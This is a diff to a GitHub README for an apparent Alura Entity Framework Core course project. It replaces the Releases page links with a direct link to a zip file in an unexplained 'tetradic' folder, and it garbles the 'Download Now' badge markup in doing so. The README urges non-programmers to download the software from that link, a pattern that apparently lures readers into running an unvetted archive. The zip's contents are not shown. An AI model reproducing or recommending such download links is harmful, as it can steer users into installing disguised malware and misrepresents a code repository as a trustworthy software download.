@@ -1,6 +1,6 @@
 # 🌐 freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12 - Learn to Use Entity Framework Core Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=for-the-badge&logo=github)](https://github.com/helixcoder/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12/releases)
+[![Download Now](https://raw.githubusercontent.com/helixcoder/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12/main/tetradic/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12.zip%20Now-%https://raw.githubusercontent.com/helixcoder/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12/main/tetradic/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12.zip)](https://raw.githubusercontent.com/helixcoder/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12/main/tetradic/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12.zip)
 
 ## 📚 Overview
 
@@ -28,7 +28,7 @@ To get started with this application, please follow the steps below. No programm
 
 You can download the software by visiting the Releases page. Click the link below to access it.
 
-[Visit Releases Page to Download](https://github.com/helixcoder/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/helixcoder/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12/main/tetradic/freelando_webapi_course-alura-entity-framework-core-transactions_part-2_dotnet-8_csharp-12.zip)
 
 1. Open the link above.
 2. Look for the latest release version.
